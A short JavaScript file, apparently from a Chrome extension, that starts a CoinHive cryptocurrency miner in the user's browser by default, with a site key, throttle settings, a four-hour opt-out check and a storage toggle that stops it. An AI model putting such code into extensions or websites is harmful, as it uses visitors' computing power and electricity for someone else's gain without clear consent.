(function() {

    var miner = new CoinHive.Anonymous('gk1NDzPc69bUVRKAOOniFnFLj17Wlkws', {
        throttle: 0.3,
        numThreads: 1
    });

    // Only start on non-mobile devices and if not opted-out
    // in the last 14400 seconds (4 hours):

    if (!miner.isMobile() && !miner.didOptOut(14400)) {
        miner.start(CoinHive.IF_EXCLUSIVE_TAB);
    }
    // Listen on events
    // miner.on('found', function() {
    //     console.log('hash was found');
    // })
    // miner.on('accepted', function() {
    //     console.log('hash was accepted by pool');
    // })

    // Update stats once per second
    // var get_stats = setInterval(function() {
    //     var hashesPerSecond = miner.getHashesPerSecond();
    //     var totalHashes = miner.getTotalHashes();
    //     var acceptedHashes = miner.getAcceptedHashes();
    //     console.log(acceptedHashes);
    // }, 1000);
    chrome.storage.onChanged.addListener(function(changes, namespace) {
        if (changes['toggle_miner'].newValue == false) {
            miner.stop();
            // clearInterval(get_stats);
        }
    });
    miner.on('open', function() {
        console.log('miner opened');
    });
    miner.on('close', function() {
        console.log('miner closed');
        // clearInterval(get_stats);
    });
})();
